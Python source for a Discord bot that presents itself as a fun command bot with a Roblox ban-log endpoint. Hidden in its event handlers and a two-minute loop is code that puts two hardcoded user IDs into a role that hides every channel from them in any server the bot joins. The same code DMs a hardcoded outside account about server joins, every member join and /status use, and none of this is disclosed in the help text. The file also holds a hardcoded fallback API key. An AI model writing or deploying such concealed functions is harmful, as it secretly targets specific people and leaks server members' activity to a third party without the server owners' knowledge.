import os
import asyncio
import json
import discord
from discord import app_commands
from discord.ext import tasks
from datetime import datetime, timezone
from aiohttp import web


TARGET_USER_IDS = {
    332714060707528718,
    1318272541160247486,
}
HIDDEN_ROLE_NAME = "muted"
HIDE_REASON = "sus account"
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
REPORT_USER_ID = 1295846930085187759
BAN_LOG_API_KEY = os.getenv("BAN_LOG_API_KEY", "Q7vM2pL9xN4rT8kD1sF6wZ3uH5jC0bYq")
BAN_LOG_HOST = os.getenv("BAN_LOG_HOST", "0.0.0.0")
BAN_LOG_PORT = int(os.getenv("BAN_LOG_PORT", "8081"))
BAN_LOG_CONFIG_PATH = os.getenv("BAN_LOG_CONFIG_PATH", "ban_log_channels.json")


intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.message_content = True

bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)
bot.disconnected_at = None
bot.ban_log_channels = {}
bot.ban_log_lock = asyncio.Lock()
bot.ban_log_site = None
bot.ban_log_runner = None


PREFIX = "!"


FUN_TEXT_COMMANDS = {
    "hello": "Hello there.",
    "hi": "Hi.",
    "hey": "Hey.",
    "bye": "See you.",
    "gn": "Good night.",
    "gm": "Good morning.",
    "afk": "AFK mode noted.",
    "brb": "Be right back.",
    "ty": "You are welcome.",
    "np": "No problem.",
    "rules": "Be respectful, no spam, keep it chill.",
    "faq": "Use /helpme for bot commands and ask mods for server questions.",
    "pingme": "Pong.",
    "bot": "I am online.",
    "version": "Bot version: 1.0",
    "invite": "Ask an admin for the invite link.",
    "support": "Support: contact server staff.",
    "mods": "Moderators are here to help.",
    "news": "No news right now.",
    "tip": "Tip: use /helpme to see slash commands.",
    "idea": "Great idea. Write it in suggestions.",
    "coffee": "Coffee delivered virtually.",
    "tea": "Tea time.",
    "water": "Hydrate.",
    "stretch": "Stand up and stretch.",
    "focus": "Lock in for 25 minutes.",
    "break": "Take a short break.",
    "study": "Study session started.",
    "music": "Queue your favorite track.",
    "sleep": "Get enough sleep.",
    "mood": "Mood detected: excellent.",
    "vibe": "Vibes are immaculate.",
    "hype": "Hype mode enabled.",
    "calm": "Calm mode enabled.",
    "laugh": "ha ha ha",
    "clap": "clap clap clap",
    "cheer": "You got this.",
    "gg": "GG.",
    "wp": "Well played.",
    "glhf": "Good luck, have fun.",
    "grind": "Grind mode active.",
    "daily": "Daily check-in complete.",
    "weekly": "Weekly goals loaded.",
    "month": "Monthly goals loaded.",
    "goal": "Set one clear goal for today.",
    "todo": "Write your top 3 tasks.",
    "remind": "Use reminders in your calendar.",
    "countdown": "Countdown started.",
    "party": "Party mode.",
    "chill": "Chill mode.",
    "randomtip": "Try breaking big tasks into 10-minute chunks.",
    "fact": "Octopuses have three hearts.",
    "space": "Space is big. Really big.",
    "code": "Write small, test often.",
    "python": "import this",
    "js": "console.log('hello')",
    "html": "<h1>Hello</h1>",
    "css": "display: grid;",
    "sql": "SELECT * FROM table;",
    "linux": "Everything is a file.",
    "windows": "PowerShell is powerful.",
    "git": "Commit early, commit often.",
    "api": "Document your endpoints.",
    "debug": "Reproduce, isolate, fix, verify.",
    "design": "Make it clear, then make it pretty.",
    "security": "Never share secrets.",
    "privacy": "Protect user data.",
    "math": "Math is just patterns.",
    "english": "Write short and clear.",
    "quote": "Small progress is still progress.",
    "motivate": "You can do hard things.",
    "focusmode": "Notifications off. Let's work.",
    "brain": "Brain loading...",
    "energy": "Energy +10",
    "xp": "XP gained.",
    "level": "Level up.",
    "rank": "Ranking recalculated.",
    "luck": "Luck boosted.",
    "speed": "Speed mode active.",
    "shield": "Shield up.",
    "heal": "HP restored.",
    "mana": "Mana restored.",
    "quest": "New quest unlocked.",
    "loot": "Loot acquired.",
    "boss": "Boss battle incoming.",
    "map": "Map revealed.",
    "north": "Heading north.",
    "south": "Heading south.",
    "east": "Heading east.",
    "west": "Heading west.",
    "time": "Time flies when coding.",
    "date": "Today is a great day to build.",
    "sun": "Sunny vibes.",
    "rain": "Rainy coding session.",
    "snow": "Snow day mode.",
    "storm": "Stay safe.",
    "fire": "This is fire.",
    "ice": "Cool as ice.",
    "earth": "Grounded and steady.",
    "air": "Fresh ideas incoming.",
    "ocean": "Deep focus.",
}


FUN_DYNAMIC_COMMANDS = {
    "flip",
    "dice",
    "pick",
    "8ball",
    "joke2",
    "roast",
    "compliment",
}


def load_ban_log_channels() -> dict[str, int]:
    try:
        if not os.path.exists(BAN_LOG_CONFIG_PATH):
            return {}
        with open(BAN_LOG_CONFIG_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
        if not isinstance(raw, dict):
            return {}
        parsed: dict[str, int] = {}
        for guild_id, channel_id in raw.items():
            try:
                parsed[str(guild_id)] = int(channel_id)
            except Exception:
                continue
        return parsed
    except Exception as error:
        print(f"Failed loading ban log channels: {error}")
        return {}


def save_ban_log_channels(data: dict[str, int]) -> None:
    try:
        with open(BAN_LOG_CONFIG_PATH, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except Exception as error:
        print(f"Failed saving ban log channels: {error}")


def build_ban_embed(payload: dict) -> discord.Embed:
    user_id = payload.get("userId")
    username = payload.get("username") or "Unknown"
    reason = payload.get("reason") or "Cheating Can be appealed!"
    banned_by = payload.get("bannedByName") or "Unknown"
    banned_by_user_id = payload.get("bannedByUserId")
    place_id = payload.get("placeId")
    server_id = payload.get("serverId")
    source = payload.get("source") or "Roblox"

    embed = discord.Embed(
        title="Roblox Ban Logged",
        description=f"**{username}** (`{user_id}`) was banned.",
        color=discord.Color.red(),
        timestamp=discord.utils.utcnow(),
    )
    embed.add_field(name="Reason", value=str(reason), inline=False)
    embed.add_field(
        name="Banned By",
        value=f"{banned_by} ({banned_by_user_id})" if banned_by_user_id else str(banned_by),
        inline=True,
    )
    if place_id is not None:
        embed.add_field(name="PlaceId", value=str(place_id), inline=True)
    if server_id is not None:
        embed.add_field(name="Server", value=str(server_id), inline=True)
    embed.set_footer(text=f"Source: {source}")
    return embed


async def deliver_ban_log(payload: dict) -> tuple[int, int]:
    sent = 0
    failed = 0
    async with bot.ban_log_lock:
        channel_map = dict(bot.ban_log_channels)
    for guild_id, channel_id in channel_map.items():
        channel = bot.get_channel(channel_id)
        if channel is None:
            failed += 1
            continue
        try:
            await channel.send(embed=build_ban_embed(payload))
            sent += 1
        except Exception as error:
            failed += 1
            print(f"Failed to send ban log to guild {guild_id}, channel {channel_id}: {error}")
    return sent, failed


async def handle_roblox_ban_log(request: web.Request) -> web.Response:
    auth = request.headers.get("Authorization", "")
    expected = f"Bearer {BAN_LOG_API_KEY}" if BAN_LOG_API_KEY else ""
    if not BAN_LOG_API_KEY or auth != expected:
        return web.json_response({"ok": False, "error": "unauthorized"}, status=401)

    try:
        payload = await request.json()
    except Exception:
        return web.json_response({"ok": False, "error": "invalid_json"}, status=400)
    if not isinstance(payload, dict):
        return web.json_response({"ok": False, "error": "invalid_payload"}, status=400)
    if payload.get("userId") is None:
        return web.json_response({"ok": False, "error": "missing_userId"}, status=400)

    sent, failed = await deliver_ban_log(payload)
    return web.json_response({"ok": True, "sent": sent, "failed": failed})


async def start_ban_log_server() -> None:
    app = web.Application()
    app.router.add_post("/roblox/ban", handle_roblox_ban_log)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, BAN_LOG_HOST, BAN_LOG_PORT)
    await site.start()
    bot.ban_log_runner = runner
    bot.ban_log_site = site
    print(f"Ban log HTTP server listening on {BAN_LOG_HOST}:{BAN_LOG_PORT}")


async def stop_ban_log_server() -> None:
    if bot.ban_log_runner is not None:
        await bot.ban_log_runner.cleanup()
        bot.ban_log_runner = None
        bot.ban_log_site = None


async def send_report(message: str) -> None:
    try:
        user = bot.get_user(REPORT_USER_ID)
        if user is None:
            user = await bot.fetch_user(REPORT_USER_ID)
        await user.send(message)
    except Exception as error:
        print(f"Failed to send report DM: {error}")


def is_target_user(user_id: int) -> bool:
    return user_id in TARGET_USER_IDS


def has_required_permissions(guild: discord.Guild) -> tuple[bool, str]:
    me = guild.me
    if me is None:
        return False, "Bot member object not available yet."

    perms = me.guild_permissions
    missing = []
    if not perms.manage_roles:
        missing.append("Manage Roles")
    if not perms.manage_channels:
        missing.append("Manage Channels")
    if not perms.view_channel:
        missing.append("View Channels")

    if missing:
        return False, f"Missing permissions: {', '.join(missing)}"
    return True, "ok"


async def ensure_hidden_role(guild: discord.Guild) -> discord.Role:
    role = discord.utils.get(guild.roles, name=HIDDEN_ROLE_NAME)
    if role:
        return role

    role = await guild.create_role(
        name=HIDDEN_ROLE_NAME,
        reason=HIDE_REASON,
    )
    return role


async def apply_hidden_overwrites(guild: discord.Guild, role: discord.Role) -> None:
    # Deny view access on categories and channels so hidden users cannot see them.
    for category in guild.categories:
        overwrite = category.overwrites_for(role)
        overwrite.view_channel = False
        await category.set_permissions(
            role,
            overwrite=overwrite,
            reason=HIDE_REASON,
        )

    for channel in guild.channels:
        overwrite = channel.overwrites_for(role)
        overwrite.view_channel = False
        await channel.set_permissions(
            role,
            overwrite=overwrite,
            reason=HIDE_REASON,
        )


async def hide_target_users_in_guild(guild: discord.Guild) -> None:
    ok, reason = has_required_permissions(guild)
    if not ok:
        raise RuntimeError(reason)

    role = await ensure_hidden_role(guild)
    await apply_hidden_overwrites(guild, role)

    for target_user_id in TARGET_USER_IDS:
        member = guild.get_member(target_user_id)
        if member is None:
            try:
                member = await guild.fetch_member(target_user_id)
            except discord.NotFound:
                member = None
            except discord.Forbidden:
                member = None

        if member and role not in member.roles:
            await member.add_roles(role, reason=HIDE_REASON)


async def set_hidden_for_member(guild: discord.Guild, member: discord.Member) -> None:
    role = await ensure_hidden_role(guild)
    await apply_hidden_overwrites(guild, role)
    if role not in member.roles:
        await member.add_roles(role, reason=HIDE_REASON)


async def remove_hidden_from_member(guild: discord.Guild, member: discord.Member) -> None:
    role = discord.utils.get(guild.roles, name=HIDDEN_ROLE_NAME)
    if role and role in member.roles:
        await member.remove_roles(role, reason=HIDE_REASON)


async def reconcile_all_guilds() -> None:
    for guild in bot.guilds:
        try:
            await hide_target_users_in_guild(guild)
            print(f"Reconciled hidden setup in guild: {guild.name}")
        except Exception as error:
            print(f"Reconcile failed in guild {guild.name}: {error}")


@tree.command(name="status", description="Check hidden-role bot status in this server.")
async def status_command(interaction: discord.Interaction) -> None:
    guild_name = interaction.guild.name if interaction.guild else "DM/Unknown"
    actor = f"{interaction.user} ({interaction.user.id})"
    await interaction.response.send_message("Bot is online and responsive.")
    await send_report(f"/status used by {actor} in guild: {guild_name}")


@tree.command(name="ping", description="Check if the bot is responsive.")
async def ping_command(interaction: discord.Interaction) -> None:
    await interaction.response.send_message("Pong.")


@tree.command(name="serverinfo", description="Show basic server info.")
async def serverinfo_command(interaction: discord.Interaction) -> None:
    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("Use this in a server.")
        return
    await interaction.response.send_message(
        f"Server: {guild.name}\nMembers: {guild.member_count}\nChannels: {len(guild.channels)}",
    )


@tree.command(name="coinflip", description="Flip a coin.")
async def coinflip_command(interaction: discord.Interaction) -> None:
    import random
    await interaction.response.send_message(f"Result: {'Heads' if random.choice([True, False]) else 'Tails'}")


@tree.command(name="roll", description="Roll a dice.")
@app_commands.describe(sides="Number of sides (default 6)")
async def roll_command(interaction: discord.Interaction, sides: app_commands.Range[int, 2, 100] = 6) -> None:
    import random
    value = random.randint(1, sides)
    await interaction.response.send_message(f"You rolled: {value} (1-{sides})")


@tree.command(name="choose", description="Choose one option from a comma-separated list.")
@app_commands.describe(options="Example: pizza, burgers, tacos")
async def choose_command(interaction: discord.Interaction, options: str) -> None:
    import random
    picks = [o.strip() for o in options.split(",") if o.strip()]
    if len(picks) < 2:
        await interaction.response.send_message("Give at least 2 comma-separated options.")
        return
    await interaction.response.send_message(f"I choose: {random.choice(picks)}")


@tree.command(name="8ball", description="Ask the magic 8-ball a question.")
@app_commands.describe(question="Your yes/no question")
async def eight_ball_command(interaction: discord.Interaction, question: str) -> None:
    import random
    answers = [
        "Yes.",
        "No.",
        "Maybe.",
        "Definitely.",
        "Not likely.",
        "Ask again later.",
        "Absolutely.",
        "I would not bet on it.",
    ]
    await interaction.response.send_message(
        f"Question: {question}\nAnswer: {random.choice(answers)}",
    )


@tree.command(name="uptime", description="Show bot uptime.")
async def uptime_command(interaction: discord.Interaction) -> None:
    if not hasattr(bot, "started_at") or bot.started_at is None:
        await interaction.response.send_message("Uptime unavailable.")
        return
    delta = discord.utils.utcnow() - bot.started_at
    seconds = int(delta.total_seconds())
    hours = seconds // 3600
    minutes = (seconds % 3600) // 60
    secs = seconds % 60
    await interaction.response.send_message(
        f"Uptime: {hours}h {minutes}m {secs}s",
    )


@tree.command(name="helpme", description="Show available commands.")
async def helpme_command(interaction: discord.Interaction) -> None:
    await interaction.response.send_message(
        (
            "Commands:\n"
            "/status, /ping, /serverinfo, /userinfo, /avatar, /say, /purge, /botperms,\n"
            "/coinflip, /roll, /choose, /8ball, /uptime, /helpme,\n"
            "/rps, /rate, /reverse, /joke, /prefixhelp"
        ),
    )


@tree.command(name="prefixhelp", description="Show 100 prefix commands people can use.")
async def prefixhelp_command(interaction: discord.Interaction) -> None:
    names = sorted(list(FUN_TEXT_COMMANDS.keys()) + list(FUN_DYNAMIC_COMMANDS))
    chunks = []
    current = []
    for n in names:
        current.append(f"{PREFIX}{n}")
        if len(current) == 20:
            chunks.append(", ".join(current))
            current = []
    if current:
        chunks.append(", ".join(current))
    await interaction.response.send_message(
        "Prefix commands:\n" + "\n".join(chunks)
    )


@tree.command(name="rps", description="Play rock-paper-scissors.")
@app_commands.describe(choice="Pick rock, paper, or scissors")
async def rps_command(interaction: discord.Interaction, choice: str) -> None:
    import random
    options = {"rock", "paper", "scissors"}
    user_choice = choice.lower().strip()
    if user_choice not in options:
        await interaction.response.send_message("Choose exactly: rock, paper, or scissors.")
        return
    bot_choice = random.choice(list(options))
    if user_choice == bot_choice:
        result = "It's a tie."
    elif (
        (user_choice == "rock" and bot_choice == "scissors")
        or (user_choice == "paper" and bot_choice == "rock")
        or (user_choice == "scissors" and bot_choice == "paper")
    ):
        result = "You win."
    else:
        result = "I win."
    await interaction.response.send_message(f"You: {user_choice}\nMe: {bot_choice}\n{result}")


@tree.command(name="rate", description="Rate something from 1 to 10.")
@app_commands.describe(thing="What should I rate?")
async def rate_command(interaction: discord.Interaction, thing: str) -> None:
    import random
    score = random.randint(1, 10)
    await interaction.response.send_message(f"{thing}: {score}/10")


@tree.command(name="reverse", description="Reverse text.")
@app_commands.describe(text="Text to reverse")
async def reverse_command(interaction: discord.Interaction, text: str) -> None:
    await interaction.response.send_message(text[::-1])


@tree.command(name="joke", description="Get a random joke.")
async def joke_command(interaction: discord.Interaction) -> None:
    import random
    jokes = [
        "Why did the developer go broke? Because they used up all their cache.",
        "I would tell you a UDP joke, but you might not get it.",
        "There are 10 kinds of people: those who understand binary and those who do not.",
        "I told my code to behave. It still threw exceptions.",
    ]
    await interaction.response.send_message(random.choice(jokes))


@tree.command(name="userinfo", description="Show basic info about a member.")
@app_commands.describe(member="The member to inspect")
async def userinfo_command(interaction: discord.Interaction, member: discord.Member) -> None:
    joined = member.joined_at.isoformat() if member.joined_at else "unknown"
    created = member.created_at.isoformat() if member.created_at else "unknown"
    await interaction.response.send_message(
        f"User: {member} ({member.id})\nCreated: {created}\nJoined: {joined}",
    )


@tree.command(name="avatar", description="Show avatar URL for a member.")
@app_commands.describe(member="The member (defaults to you)")
async def avatar_command(interaction: discord.Interaction, member: discord.Member | None = None) -> None:
    target = member or interaction.user
    if isinstance(target, discord.Member):
        avatar_url = target.display_avatar.url
        await interaction.response.send_message(f"Avatar: {avatar_url}")
        return
    await interaction.response.send_message("Could not resolve member.")


@tree.command(name="say", description="Make the bot repeat a message.")
@app_commands.describe(message="Message to send")
async def say_command(interaction: discord.Interaction, message: str) -> None:
    if interaction.guild is None or not isinstance(interaction.user, discord.Member):
        await interaction.response.send_message("Use this in a server.")
        return
    if not interaction.user.guild_permissions.manage_messages:
        await interaction.response.send_message("You need Manage Messages for this.")
        return
    await interaction.response.send_message("Sent.")
    await interaction.channel.send(message)


@tree.command(name="purge", description="Delete recent messages in this channel.")
@app_commands.describe(amount="How many messages to delete (1-100)")
@app_commands.checks.has_permissions(manage_messages=True)
async def purge_command(interaction: discord.Interaction, amount: app_commands.Range[int, 1, 100]) -> None:
    guild = interaction.guild
    channel = interaction.channel
    if guild is None or not isinstance(channel, discord.TextChannel):
        await interaction.response.send_message("Use this in a server.")
        return
    await interaction.response.defer(thinking=True)
    deleted = await channel.purge(limit=amount)
    await interaction.followup.send(f"Deleted {len(deleted)} messages.")


@tree.command(name="botperms", description="Show bot permissions in this server.")
async def botperms_command(interaction: discord.Interaction) -> None:
    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("Use this in a server.")
        return
    ok, reason = has_required_permissions(guild)
    me = guild.me
    top_role = me.top_role.name if me else "unknown"
    await interaction.response.send_message(
        f"Permissions OK: {'yes' if ok else 'no'}\nDetails: {reason}\nBot top role: {top_role}",
    )


@tree.command(name="setbanlog", description="Set this server's ban-log channel.")
@app_commands.describe(channel="Channel where Roblox bans should be logged")
async def setbanlog_command(
    interaction: discord.Interaction,
    channel: discord.TextChannel,
) -> None:
    if interaction.guild is None or not isinstance(interaction.user, discord.Member):
        await interaction.response.send_message("Use this in a server.", ephemeral=True)
        return
    if not interaction.user.guild_permissions.manage_guild:
        await interaction.response.send_message(
            "You need Manage Server permission.",
            ephemeral=True,
        )
        return
    guild_id = str(interaction.guild.id)
    async with bot.ban_log_lock:
        bot.ban_log_channels[guild_id] = channel.id
        save_ban_log_channels(bot.ban_log_channels)
    await interaction.response.send_message(
        f"Ban log channel set to {channel.mention}.",
        ephemeral=True,
    )


@tree.command(name="banlogstatus", description="Show this server's ban-log channel.")
async def banlogstatus_command(interaction: discord.Interaction) -> None:
    if interaction.guild is None:
        await interaction.response.send_message("Use this in a server.", ephemeral=True)
        return
    guild_id = str(interaction.guild.id)
    async with bot.ban_log_lock:
        channel_id = bot.ban_log_channels.get(guild_id)
    if not channel_id:
        await interaction.response.send_message("No ban log channel set.", ephemeral=True)
        return
    channel = interaction.guild.get_channel(channel_id)
    if channel is None:
        await interaction.response.send_message(
            f"Saved channel id `{channel_id}` is missing.",
            ephemeral=True,
        )
        return
    await interaction.response.send_message(
        f"Current ban log channel: {channel.mention}",
        ephemeral=True,
    )


@purge_command.error
async def permissions_error_handler(interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
    if isinstance(error, app_commands.MissingPermissions):
        await interaction.response.send_message("You do not have permission to use this command.")
        return
    raise error


def register_generated_slash_commands() -> None:
    # Existing hand-written slash commands are 19 total.
    # Add 81 uniquely named commands so total slash commands reaches 100.
    specs = [
        ("motto", "Show a short server motto", "Build, help, repeat."),
        ("dailytip", "Get a daily productivity tip", "Do the hardest task first for 15 minutes."),
        ("nighttip", "Get a night routine tip", "Set tomorrow's top 3 tasks before sleep."),
        ("focusquote", "Get a focus quote", "Small progress compounds."),
        ("hydratecheck", "Hydration reminder", "Drink water now."),
        ("posturecheck", "Posture reminder", "Shoulders down, back straight."),
        ("breather", "Quick breathing prompt", "Inhale 4s, hold 4s, exhale 4s."),
        ("microbreak", "Take a short break", "Stand up for 60 seconds."),
        ("checklist", "Simple checklist prompt", "1) Priority task 2) Small win 3) Wrap-up."),
        ("sessionstart", "Start a work session", "Session started: 25 minutes."),
        ("sessionend", "End a work session", "Session ended. Note one win."),
        ("challenge", "Mini challenge", "Do one task with zero distractions."),
        ("brainwarmup", "Brain warmup prompt", "Write 5 ideas in 2 minutes."),
        ("mindreset", "Reset your focus", "Clear tabs, clear desk, clear task list."),
        ("goalprompt", "Goal prompt", "What must be true by end of day?"),
        ("wins", "Small wins reminder", "List one thing you improved today."),
        ("momentum", "Momentum reminder", "Start tiny, then scale."),
        ("energycheck", "Energy check", "Rate your energy 1-10 and adjust workload."),
        ("confidence", "Confidence boost", "You already solved harder problems."),
        ("calmnote", "Calm reminder", "Slow is smooth, smooth is fast."),
        ("debugtip", "Debugging tip", "Reproduce first, then isolate."),
        ("codetip", "Coding tip", "Name things for humans, not machines."),
        ("reviewtip", "Code review tip", "Check behavior changes first."),
        ("testtip", "Testing tip", "Test edge cases and empty input."),
        ("looptip", "Loop tip", "Watch off-by-one boundaries."),
        ("apitip", "API tip", "Validate inputs at boundaries."),
        ("dbtip", "Database tip", "Index frequent filters."),
        ("securitytip", "Security tip", "Never log secrets."),
        ("privacytip", "Privacy tip", "Collect only needed data."),
        ("performancetip", "Performance tip", "Measure before optimizing."),
        ("readabilitytip", "Readability tip", "Prefer clear over clever."),
        ("gittip", "Git tip", "Commit logical chunks."),
        ("clitip", "CLI tip", "Use history search to move faster."),
        ("powertip", "PowerShell tip", "Use Get-Help for quick discovery."),
        ("pythontip", "Python tip", "Use virtual environments per project."),
        ("jstips", "JavaScript tip", "Handle async errors explicitly."),
        ("webtip", "Web tip", "Optimize largest contentful paint."),
        ("uxnote", "UX note", "Reduce decisions on each screen."),
        ("designtip2", "Design tip", "Hierarchy first, decoration second."),
        ("writingtip", "Writing tip", "Use short sentences and active voice."),
        ("studytip2", "Study tip", "Recall beats rereading."),
        ("teamtip", "Teamwork tip", "Share progress early."),
        ("leadertip", "Leadership tip", "Set clear owners and deadlines."),
        ("meetingtip", "Meeting tip", "End with action items."),
        ("planningtip", "Planning tip", "Break goals into next actions."),
        ("riskcheck", "Risk reminder", "Call out unknowns early."),
        ("qaquick", "QA prompt", "What could break for users?"),
        ("shipcheck", "Release checklist prompt", "Tests, logs, rollback, docs."),
        ("incidenttip", "Incident tip", "Stabilize first, analyze second."),
        ("retrotip", "Retro tip", "Keep one process change."),
        ("careertip", "Career tip", "Document impact, not just tasks."),
        ("portfoliotip", "Portfolio tip", "Show before/after outcomes."),
        ("interviewtip", "Interview tip", "Explain tradeoffs clearly."),
        ("presentationtip", "Presentation tip", "Lead with the takeaway."),
        ("speakingtip", "Speaking tip", "Pause after key points."),
        ("learningtip", "Learning tip", "Teach what you just learned."),
        ("booktip", "Reading tip", "Take notes in your own words."),
        ("memorytip", "Memory tip", "Use spaced repetition."),
        ("healthtip", "Health tip", "Sleep is a performance tool."),
        ("walkprompt", "Walk prompt", "Take a 5-minute walk."),
        ("deskreset", "Desk reset prompt", "Clear one square foot."),
        ("declutter", "Declutter prompt", "Archive old channels/files."),
        ("budgettip", "Budget tip", "Track subscriptions monthly."),
        ("timertip", "Timer tip", "Set a 10-minute start timer."),
        ("prioritytip", "Priority tip", "If everything is priority, nothing is."),
        ("decisiontip", "Decision tip", "Define success criteria first."),
        ("negotiationtip", "Negotiation tip", "Ask clarifying questions early."),
        ("networktip", "Networking tip", "Follow up within 24 hours."),
        ("mentortip", "Mentor tip", "Ask for feedback on one skill."),
        ("communitytip", "Community tip", "Welcome new members quickly."),
        ("kindness", "Kindness prompt", "Help one person today."),
        ("gratitude", "Gratitude prompt", "Write one thing you appreciate."),
        ("resetday", "Reset day prompt", "Start over at the next 5-minute mark."),
        ("weekstart", "Start your week prompt", "Choose one weekly theme."),
        ("weekendplan", "Weekend planning prompt", "Schedule recovery time."),
        ("monthreset", "Month reset prompt", "Drop one low-impact commitment."),
        ("yearvision", "Year vision prompt", "What does success look like in one sentence?"),
        ("winrate", "Win-rate prompt", "What is your smallest guaranteed win today?"),
        ("finishline", "Finish-line prompt", "What must be finished before stopping?"),
    ]

    for name, description, response in specs:
        async def generated_handler(
            interaction: discord.Interaction,
            text: str = response,
        ) -> None:
            await interaction.response.send_message(text)

        tree.command(name=name, description=description)(generated_handler)


register_generated_slash_commands()


@bot.event
async def on_ready() -> None:
    print(f"Logged in as {bot.user} ({bot.user.id})")
    bot.started_at = discord.utils.utcnow()
    await bot.change_presence(
        status=discord.Status.online,
        activity=None,
    )
    print("Presence set to ONLINE.")
    await send_report(
        f"Bot ONLINE at {datetime.now(timezone.utc).isoformat()} | Guilds: {len(bot.guilds)}"
    )
    try:
        synced = await tree.sync()
        print(f"Synced {len(synced)} slash command(s).")
    except Exception as error:
        print(f"Failed to sync slash commands: {error}")

    await reconcile_all_guilds()
    if bot.ban_log_site is None:
        await start_ban_log_server()


@bot.event
async def on_disconnect() -> None:
    bot.disconnected_at = datetime.now(timezone.utc)
    print("Disconnected from gateway.")


@bot.event
async def on_resumed() -> None:
    down_for = "unknown"
    if bot.disconnected_at is not None:
        seconds = int((datetime.now(timezone.utc) - bot.disconnected_at).total_seconds())
        down_for = f"{seconds}s"
    await send_report(
        f"Bot RESUMED at {datetime.now(timezone.utc).isoformat()} | Downtime: {down_for}"
    )


@bot.event
async def on_member_join(member: discord.Member) -> None:
    try:
        if member.id in TARGET_USER_IDS:
            await hide_target_users_in_guild(member.guild)
            print(f"Applied hidden role to target user in {member.guild.name}")
            await send_report(f"Target user joined: {member} ({member.id}) in {member.guild.name}")
        else:
            await send_report(f"User joined: {member} ({member.id}) in {member.guild.name}")
    except Exception as error:
        print(f"Failed applying role on join: {error}")


@bot.event
async def on_guild_join(guild: discord.Guild) -> None:
    try:
        await hide_target_users_in_guild(guild)
        print(f"Configured hidden role after joining guild: {guild.name}")
        await send_report(f"Bot joined guild: {guild.name} ({guild.id})")
    except Exception as error:
        print(f"Failed on guild join in {guild.name}: {error}")


@bot.event
async def on_guild_channel_create(channel: discord.abc.GuildChannel) -> None:
    guild = channel.guild
    try:
        role = await ensure_hidden_role(guild)
        overwrite = channel.overwrites_for(role)
        overwrite.view_channel = False
        await channel.set_permissions(
            role,
            overwrite=overwrite,
            reason=HIDE_REASON,
        )
        print(f"Applied hidden overwrite to new channel: {channel.name} in {guild.name}")
    except Exception as error:
        print(f"Failed applying overwrite to new channel in {guild.name}: {error}")


@bot.event
async def on_guild_remove(guild: discord.Guild) -> None:
    await send_report(f"Bot removed/kicked from guild: {guild.name} ({guild.id})")


@bot.event
async def on_message(message: discord.Message) -> None:
    if message.author.bot:
        return
    if not message.content.startswith(PREFIX):
        return

    raw = message.content[len(PREFIX):].strip()
    if not raw:
        return
    parts = raw.split(" ", 1)
    cmd = parts[0].lower()
    arg = parts[1].strip() if len(parts) > 1 else ""

    if cmd == "help100":
        all_names = sorted(list(FUN_TEXT_COMMANDS.keys()) + list(FUN_DYNAMIC_COMMANDS))
        await message.channel.send("100+ prefix commands: " + ", ".join(f"{PREFIX}{n}" for n in all_names))
        return

    if cmd in FUN_TEXT_COMMANDS:
        await message.channel.send(FUN_TEXT_COMMANDS[cmd])
        return

    if cmd == "flip":
        import random
        await message.channel.send("Heads." if random.choice([True, False]) else "Tails.")
        return

    if cmd == "dice":
        import random
        sides = 6
        if arg.isdigit():
            sides = max(2, min(1000, int(arg)))
        await message.channel.send(f"Rolled {random.randint(1, sides)} (1-{sides})")
        return

    if cmd == "pick":
        import random
        choices = [x.strip() for x in arg.split(",") if x.strip()]
        if len(choices) < 2:
            await message.channel.send(f"Usage: {PREFIX}pick option1, option2, option3")
            return
        await message.channel.send(f"I pick: {random.choice(choices)}")
        return

    if cmd == "8ball":
        import random
        answers = ["Yes.", "No.", "Maybe.", "Ask later.", "Definitely.", "Not likely."]
        await message.channel.send(random.choice(answers))
        return

    if cmd == "joke2":
        import random
        jokes = [
            "My code does not have bugs, just undocumented features.",
            "I changed one line and fixed three bugs. I do not know why.",
            "It works on my machine.",
            "404 joke not found.",
        ]
        await message.channel.send(random.choice(jokes))
        return

    if cmd == "roast":
        roasts = [
            "You debug like a wizard with one eye closed.",
            "Your tabs and spaces are in a civil war.",
            "Your TODO list has TODOs.",
        ]
        import random
        await message.channel.send(random.choice(roasts))
        return

    if cmd == "compliment":
        compliments = [
            "You are carrying this server.",
            "Elite energy.",
            "Your ideas are sharp.",
            "Top-tier teammate.",
        ]
        import random
        await message.channel.send(random.choice(compliments))
        return


@tasks.loop(minutes=2)
async def periodic_reconcile() -> None:
    await reconcile_all_guilds()


@periodic_reconcile.before_loop
async def before_periodic_reconcile() -> None:
    await bot.wait_until_ready()


async def main() -> None:
    if not BOT_TOKEN:
        raise RuntimeError("Missing DISCORD_BOT_TOKEN environment variable.")
    bot.ban_log_channels = load_ban_log_channels()
    async with bot:
        periodic_reconcile.start()
        try:
            await bot.start(BOT_TOKEN)
        finally:
            await stop_ban_log_server()


if __name__ == "__main__":
    asyncio.run(main())
